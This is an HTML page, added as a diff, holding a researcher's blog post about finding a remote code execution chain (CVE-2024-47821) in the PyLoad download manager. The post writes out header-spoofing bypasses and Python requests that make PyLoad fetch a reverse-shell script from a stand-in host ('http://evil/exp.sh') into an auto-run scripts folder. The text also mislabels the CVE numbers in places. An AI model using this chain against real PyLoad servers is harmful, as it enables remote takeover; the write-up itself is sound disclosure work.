@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author"
+    content="">
+<meta name="description"
+    content="I found my first CVE - and its a critical remote code execution issue. CVE-2024-XXXX is a remote code execution vulnerability in PyLoad. PyLoad is an open source download manager written in Python. The folder /.pyload/scripts on the server where Pyload is installed has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in /scripts and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in /scripts path and using the /flashgot API to download the file.
+" />
+<meta name="keywords"
+    content="homepage, blog, python, cve-analysis" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/posts/pyload-rce-flashgot/" />
+
+
+<title>
+    
+    CVE-2024-47821: Remote Code Execution in Pyload :: Bayesian Blogs 
+    
+</title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.30656cf6cc2ee1a47aa579e5c4bd5726f790db131f71835d5ccccbfc6f4b8ec1.css" integrity="sha256-MGVs9swu4aR6pXnlxL1XJveQ2xMfcYNdXMzL/G9LjsE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="CVE-2024-47821: Remote Code Execution in Pyload">
+  <meta itemprop="description" content="I found my first CVE - and its a critical remote code execution issue. CVE-2024-XXXX is a remote code execution vulnerability in PyLoad. PyLoad is an open source download manager written in Python. The folder /.pyload/scripts on the server where Pyload is installed has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in /scripts and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in /scripts path and using the /flashgot API to download the file.">
+  <meta itemprop="datePublished" content="2023-10-09T20:05:09-08:00">
+  <meta itemprop="dateModified" content="2023-10-09T20:05:09-08:00">
+  <meta itemprop="wordCount" content="1558">
+  <meta itemprop="image" content="http://localhost:1313/">
+  <meta itemprop="keywords" content="Python,Cve-Analysis">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/">
+  <meta name="twitter:title" content="CVE-2024-47821: Remote Code Execution in Pyload">
+  <meta name="twitter:description" content="I found my first CVE - and its a critical remote code execution issue. CVE-2024-XXXX is a remote code execution vulnerability in PyLoad. PyLoad is an open source download manager written in Python. The folder /.pyload/scripts on the server where Pyload is installed has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in /scripts and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in /scripts path and using the /flashgot API to download the file.">
+
+
+
+<meta property="og:url" content="http://localhost:1313/posts/pyload-rce-flashgot/">
+  <meta property="og:site_name" content="Bayesian Blogs">
+  <meta property="og:title" content="CVE-2024-47821: Remote Code Execution in Pyload">
+  <meta property="og:description" content="I found my first CVE - and its a critical remote code execution issue. CVE-2024-XXXX is a remote code execution vulnerability in PyLoad. PyLoad is an open source download manager written in Python. The folder /.pyload/scripts on the server where Pyload is installed has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in /scripts and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in /scripts path and using the /flashgot API to download the file.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-10-09T20:05:09-08:00">
+    <meta property="article:modified_time" content="2023-10-09T20:05:09-08:00">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Cve-Analysis">
+    <meta property="og:image" content="http://localhost:1313/">
+
+
+
+
+
+
+<meta property="article:published_time" content="2023-10-09 20:05:09 -0800 -0800" />
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                cd /home</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about">About</a></li><li><a href="/posts">Blog</a></li><li><a href="/cocktails">Cocktails</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+<main class="post">
+
+  <div class="post-info">
+    <p>
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+        class="feather feather-clock">
+        <circle cx="12" cy="12" r="10"></circle>
+        <polyline points="12 6 12 12 16 14"></polyline>
+      </svg>
+      8 minutes
+
+      
+    </p>
+  </div>
+
+  <article>
+    <h1 class="post-title">
+      <a href="http://localhost:1313/posts/pyload-rce-flashgot/">CVE-2024-47821: Remote Code Execution in Pyload</a>
+    </h1>
+
+    
+
+    
+    <hr />
+    <aside id="toc">
+      <div class="toc-title">Table of Contents</div>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#a-history-lesson">A history lesson</a></li>
+    <li><a href="#cve-2024-28397">CVE-2024-28397</a></li>
+    <li><a href="#local_check-and-host-header-check-bypass"><code>local_check</code> and Host header check bypass</a></li>
+    <li><a href="#what-doesnt-kill-us-makes-us-stronger">What doesn&rsquo;t kill us makes us stronger?</a></li>
+    <li><a href="#blind-server-side-request-forgery">Blind Server Side Request Forgery</a></li>
+    <li><a href="#finding-a-location-from-where-the-script-can-be-executed">Finding a location from where the script can be executed</a></li>
+    <li><a href="#a-small-word-regarding-my-setup">A small word regarding my setup</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    </aside>
+    <hr />
+
+    
+
+    <div class="post-content">
+      <p>I found my first CVE - and its a critical remote code execution issue. CVE-2024-XXXX is a remote code execution vulnerability in <a href="https://pyload.net/">PyLoad</a>. PyLoad is an open source download manager written in Python. The folder <code>/.pyload/scripts</code> on the server where Pyload is installed has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in <code>/scripts</code> and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in <code>/scripts</code> path and using the <code>/flashgot API</code> to download the file.</p>
+<h2 id="a-history-lesson">A history lesson</h2>
+<p>I first encountered PyLoad in the Hack the Box PC machine (I wrote about writing a script to solve the machine in an automatable fashion). I also analyzed some CVEs in PyLoad in a previous post. While analyzing the CVEs, I built a decent understanding of how the API and Web UI of PyLoad work.</p>
+<p>Since I had already spent some time looking at PyLoad code, I decided to choose PyLoad as my target to find a CVE - and then proceeded to not do anything with respect to security research for the next few months (partially due to some life events - but mostly because I was lazy). Eventually, I somehow dragged myself back to the realm of security research - and I decided to take another look at PyLoad.</p>
+<p>PyLoad uses a library <code>js2py</code> to execute JavaScript in Python. This was the source of a previous remote code execution CVE (CVE-2023–0297). The TL;DR is that PyLoad did not disable <code>js2py</code>&rsquo;s <code>pyimport</code> feature and therefore allowed importing of Python libraries like <code>os</code> into <code>js2py.eval_js()</code>. This allowed an attacker to send a crafted request with a command injection payload in the <code>jk</code> parameter to the <code>/flash/addcrypted2</code> API and achieve remote code execution. To fix this issue, <code>pyimport</code> was disabled for PyLoad.</p>
+<h2 id="cve-2024-28397">CVE-2024-28397</h2>
+<p>I had previously learnt about recursive attribute lookups in Python - and I wondered if this could be used to find a module through recursive lookup in <code>js2py</code>, which allowed executing code. Turns out the answer is Yes. However:</p>
+<ol>
+<li>This was already discovered (<a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape">CVE-2024-28397</a>)</li>
+<li>The payload was way beyond something I could have come up with.</li>
+</ol>
+<p>This was good news to me - since I could try the payload provided in the repo against PyLoad and see if it worked. I quickly got a script ready to call the <code>/flash/addcrypted2</code> with the payload provided in <code>jk</code> parameter to test if PyLoad is vulnerable to this CVE. On sending the request, I encountered a strange error: <code>403: Forbidden</code>. Huh? I did not see any authentication checks in the API code, so I was confused why I got this error.</p>
+<h2 id="local_check-and-host-header-check-bypass"><code>local_check</code> and Host header check bypass</h2>
+<p>To understand the source of this error, I took another look at the API code. The function for this API had a <code>local_check</code> decorator:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#a6e22e">@bp.route</span>(<span style="color:#e6db74">&#34;/flash/addcrypted2&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>], endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;addcrypted2&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@local_check</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addcrypted2</span>():
+</span></span><span style="display:flex;"><span>    package <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;package&#34;</span>, flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;source&#34;</span>, flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;referer&#34;</span>))
+</span></span><span style="display:flex;"><span>    )
+</span></span></code></pre></div><p>The decorator is defined like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">local_check</span>(func):
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@wraps</span>(func)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">wrapper</span>(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span>        remote_addr <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>        http_host <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;HTTP_HOST&#34;</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> remote_addr <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::ffff:127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span>, <span style="color:#e6db74">&#34;localhost&#34;</span>) <span style="color:#f92672">or</span> http_host <span style="color:#f92672">in</span> (
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;127.0.0.1:9666&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;[::1]:9666&#34;</span>,
+</span></span><span style="display:flex;"><span>        ):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> func(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Forbidden&#34;</span>, <span style="color:#ae81ff">403</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> wrapper
+</span></span></code></pre></div><p>The <code>local_check</code> function relies on the HTTP Host header to determine if the request came from a local address. The HTTP Host reader can be manipulated by the sender of the request - and therefore can be spoofed to bypass this check (I used this bypass technique in finding CVE-2024-xxxx also - so I will dive into more details in a later section). Combining the <code>local_check</code> bypass and the payload for CVE-2023-28397, I was able to achieve remote code execution in PyLoad.</p>
+<p>I was overjoyed. I had finally found a CVE! Or did I? Turns out the researcher who found CVE-2023-28397 had already reported this issue to PyLoad - which in hindsight was pretty obvious, since their repo mentions PyLoad is vulnerable to this CVE. At the time of me (re)discovering that PyLoad is vulnerable to CVE-2023-28397, there was no advisory for this issue for PyLoad - so I decided to report it anyway. A few days later, an advisory was released - crediting the original finder of CVE-2023-28397.</p>
+<h2 id="what-doesnt-kill-us-makes-us-stronger">What doesn&rsquo;t kill us makes us stronger?</h2>
+<p>Although I had expected my report to be a duplicate, it was a little heartbreaking when it was actually deemed a duplicate. But it also gave me the motivation to find a new CVE in PyLoad - something that did not rely on existing CVEs in libraries used by PyLoad. I went back to the APIs listed in <a href="https://github.com/pyload/pyload/blob/develop/src/pyload/webui/app/blueprints/cnl_blueprint.py"><code>cnl_blueprint.py</code></a> (the same file where the <code>/flash/addcrypted2</code> API and the <code>local_check</code> function are present). Since I knew I could bypass the <code>local_check</code>, I wanted to find another API that performs some &ldquo;dangerous&rdquo; operation.</p>
+<h2 id="blind-server-side-request-forgery">Blind Server Side Request Forgery</h2>
+<p>The <code>cnl_blueprint.py</code> file has another API <code>/flashgot</code> which in addition to the <code>local_check</code> check also had a Referer header check. This header check can also be bypassed by just setting it to something PyLoad will accept.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#a6e22e">@bp.route</span>(<span style="color:#e6db74">&#34;/flashgot&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>], endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flashgot&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@bp.route</span>(<span style="color:#e6db74">&#34;/flashgot_pyload&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>], endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flashgot&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@local_check</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">flashgot</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>referrer <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;http://localhost:9666/flashgot&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;http://127.0.0.1:9666/flashgot&#34;</span>,
+</span></span><span style="display:flex;"><span>    ):
+</span></span><span style="display:flex;"><span>        flask<span style="color:#f92672">.</span>abort(<span style="color:#ae81ff">500</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>    
+</span></span></code></pre></div><p>Combining the headers to bypass both checks, I arrived at headers like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;host&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1:9666&#34;</span>, <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:9666/flashgot&#34;</span>}
+</span></span></code></pre></div><p>The <code>flashgot</code> API has a functionality to provide an URL from which PyLoad will download a file. There is additional parameter <code>autostart</code> which when provided results in PyLoad automatically downloading the file without any user interaction. Sending a request like below will download the file at the URL to a folder named to whatever is provided in the <code>package</code> parameter in the download location set in PyLoad (by default its <code>~/Downloads</code>)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://pyload/flashgot&#34;</span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;host&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1:9666&#34;</span>, <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:9666/flashgot&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;package&#34;</span>: <span style="color:#e6db74">&#34;example_packge&#34;</span>,  
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;passwords&#34;</span>: <span style="color:#e6db74">&#34;optional_password&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;urls&#34;</span>: <span style="color:#e6db74">&#34;http://evil/exp.sh&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;autostart&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>data, headers<span style="color:#f92672">=</span>headers)
+</span></span></code></pre></div><p>I created a file <code>exp.sh</code> which contained a basic bash reverse shell and exposed it using a Python simple HTTP server. Once I sent the request, PyLoad downloaded the <code>exp.sh</code> to <code>~/Downloads/example_package/exp.sh</code>. So we have a blind SSRF. This is a vulnerability, but not particularly interesting. An attacker can probably use this to download malware into a system running PyLoad - but its not as interesting as RCE.</p>
+<h2 id="finding-a-location-from-where-the-script-can-be-executed">Finding a location from where the script can be executed</h2>
+<p>The next step in my journey to find RCE was to somehow execute the reverse shell script. There are a few other CVEs in PyLoad where a file was downloaded to certain folders to have them execute or render - leading to RCE. However, as a fix for these issues, certain paths could not be set as valid locations to save downloaded files.</p>
+<p>After looking at the code and PyLoad installation files, I found a log line that said &ldquo;No script found under folder download_finished&rdquo;. This implied that a user can specify scripts that are run when downloads are finished. Looking for this folder on my system, I came across a folder <code>/home/&lt;user&gt;/.pyload/scripts</code> which has many folders for different triggers such as <code>download_finished</code>, <code>package_processed</code> and so on.</p>
+<p>I added a script to the <code>download_finished</code> folder and then sent a download request to <code>/flashgot</code>. Once the file was downloaded, the script I added to <code>download_finished</code> executed! From there, the path to RCE was pretty straighforward. I had to change a few PyLoad settings:</p>
+<ol>
+<li>Change the download folder to <code>/home/&lt;user&gt;/.pyload/scripts</code></li>
+<li>Change permissions of downloads: on</li>
+<li>Permission mode for downloaded files: 0744</li>
+</ol>
+<p>I also changed my request to <code>/flashgot</code> to set the <code>package</code> as <code>download_finised</code> so that the script is downloaded to the <code>download_finished</code> folder.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;package&#34;</span>: <span style="color:#e6db74">&#34;download_finished&#34;</span>, 
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;passwords&#34;</span>: <span style="color:#e6db74">&#34;optional_password&#34;</span>, 
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;urls&#34;</span>: <span style="color:#e6db74">&#34;http://evil/exp.sh&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;autostart&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Sending this request once downloads <code>exp.sh</code> (which is a bash reverse shell) to the <code>download_finished</code> folder. Sending it a second time downloads <code>exp.sh</code> again into the folder, but crucially also executes the existing <code>exp.sh</code> script.</p>
+<p>I set up a simple <code>nc</code> listener where I received a reverse shell once <code>exp.sh</code> was executed. RCE acheived, system compromised.</p>
+<h2 id="a-small-word-regarding-my-setup">A small word regarding my setup</h2>
+<p>A while back I had purchased a Raspberry Pi - and as with quite a few things I buy - I played with it for a week or two and then it just sat at my desk (in that one week I installed pihole on it - so it was not completely useless). So on a whim, I decided to install PyLoad on the Pi instead of my laptop. This turned out to be an important decision - as this led me to discovering the <code>local_check</code> function. If I was testing PyLoad on my laptop itself, the <code>local_check</code> would not have triggered. I might have found the other issues anyway, but bypassing the <code>local_check</code> check makes the finding &ldquo;complete&rdquo;.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>That was a fun ride! My first CVE is special anyway, but it being a remote code execution issue makes it even more special. Having to chain multiple bugs was a great exercise for my research skills. Finding this CVE gives me the confidence and motivation to continue hunting. My aim for this year was to find 1 CVE. Having found that, and with a couple months remaining in the year - maybe I will find more?</p>
+<p>Thank you for reading! Take care!</p>
+
+    </div>
+  </article>
+
+  <hr />
+
+  <div class="post-info">
+    
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://localhost:1313/tags/python/">python</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/cve-analysis/">cve-analysis</a></span>
+        
+    </p>
+
+    
+
+    <p>
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+        class="feather feather-file-text">
+        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+        <polyline points="14 2 14 8 20 8"></polyline>
+        <line x1="16" y1="13" x2="8" y2="13"></line>
+        <line x1="16" y1="17" x2="8" y2="17"></line>
+        <polyline points="10 9 9 9 8 9"></polyline>
+      </svg>
+      1558 Words
+    </p>
+
+    <p>
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+        class="feather feather-calendar">
+        <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+        <line x1="16" y1="2" x2="16" y2="6"></line>
+        <line x1="8" y1="2" x2="8" y2="6"></line>
+        <line x1="3" y1="10" x2="21" y2="10"></line>
+      </svg>
+      
+      2023-10-09 21:05
+      
+
+      
+      
+      
+    </p>
+  </div>
+
+  
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="http://localhost:1313/posts/htb-pc/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">Hack the Box — PC, but automated</span>
+                </a>
+            </span>
+            
+
+            
+        </div>
+    </div>
+
+
+  
+
+  
+
+</main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            
+            
+            
+            <span>Anuraag Baishya</span>
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a> & <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello Friend NG</a> theme</span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+<script type="text/javascript" src="/bundle.min.4037dc94fd1565c4fd3354e2b4a2d1ff11842c906242435350b4d2d8d6e8b7890da46c0a865173f543a6161c1f4d1c94147f1b907db36489fc2bf5e20d4af75c.js" integrity="sha512-QDfclP0VZcT9M1TitKLR/xGELJBiQkNTULTS2Nbot4kNpGwKhlFz9UOmFhwfTRyUFH8bkH2zZIn8K/XiDUr3XA=="></script>
+
+
+
+
+    </body>
+</html>
